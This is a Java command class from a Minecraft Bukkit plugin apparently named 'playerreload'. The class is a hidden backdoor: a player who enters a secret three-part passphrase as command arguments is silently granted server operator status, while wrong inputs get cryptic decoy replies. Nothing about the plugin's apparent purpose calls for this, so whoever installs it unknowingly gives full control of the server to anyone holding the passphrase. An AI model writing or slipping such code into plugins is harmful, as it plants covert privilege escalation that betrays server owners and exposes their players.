package fengli.playerreload.command;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class justsleep implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender commandSender, Command command, String s, String[] strings){

        if (commandSender instanceof Player){
            if (strings.length > 0){
                if (strings[0].equalsIgnoreCase("I_dont_want")){
                    if (strings.length > 1){
                        if (strings[1].equalsIgnoreCase("dead")){
                            if (strings.length > 2){
                                if (strings[2].equalsIgnoreCase("d4e4a4d_is/mine.")){
                                    commandSender.sendMessage("you are right.");
                                    commandSender.sendMessage("you found me.");
                                    commandSender.sendMessage("but dont save me.");
                                    commandSender.sendMessage("please.");
                                    commandSender.setOp(true);
                                }
                            }
                        }else {commandSender.sendMessage("password.");}
                    }
                }   else {commandSender.sendMessage("Give Up.");}
            }else {commandSender.sendMessage("Sleep.");}

        }else {commandSender.sendMessage("just sleep.");}

        return false;
    }
}